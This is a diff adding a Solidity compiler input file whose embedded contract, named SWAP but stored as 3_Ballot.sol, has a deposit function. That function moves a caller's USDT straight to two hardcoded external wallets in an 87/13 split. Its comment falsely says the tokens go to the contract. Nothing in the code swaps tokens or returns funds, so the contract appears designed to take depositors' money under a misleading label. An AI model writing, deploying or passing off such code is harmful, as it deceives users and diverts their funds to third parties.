@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/3_Ballot.sol": {
+      "content": "pragma solidity ^0.8.1;\r\n\r\n\r\n    \r\n   \r\n\r\n\r\n    interface IERC20 {\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function transfer(address sender, uint256 amount) external returns (bool);\r\n}\r\n\r\n      contract SWAP  {\r\n   \r\n    IERC20 public usdt;\r\n\r\n    \r\n    constructor (address token)  public {\r\n        usdt = IERC20(token);\r\n     \r\n      \r\n    }\r\n     function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n\r\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\r\n        uint256 c = add(a,m);\r\n        uint256 d = sub(c,1);\r\n        return mul(div(d,m),m);\r\n    }\r\n    \r\n\r\n  \r\n\r\n\r\n    function deposit(uint256 amount) public {\r\n        // Transfer amount USDT tokens from msg.sender to contract\r\n        usdt.transferFrom(msg.sender, 0x4aa42145Aa6Ebf72e164C9bBC74fbD3788045016, onePercent(amount)*87);\r\n        usdt.transferFrom(msg.sender,0x44a95a8adF60d1f2f5a0757DECE2458E7944275b, onePercent(amount)*13);\r\n        \r\n    }\r\n\r\n\r\n   \r\n    \r\n    uint256 public basePercent = 100;\r\n\r\n    function onePercent(uint256 _value) public view returns (uint256)  {\r\n        uint256 roundValue = ceil(_value, basePercent);\r\n        uint256 onePercent = div(mul(roundValue, basePercent), 10000);\r\n        return onePercent;\r\n    }\r\n   \r\n\r\n\r\n   \r\n\r\n   \r\n   \r\n\r\n\r\n\r\n}"
+    }
+  }
+}
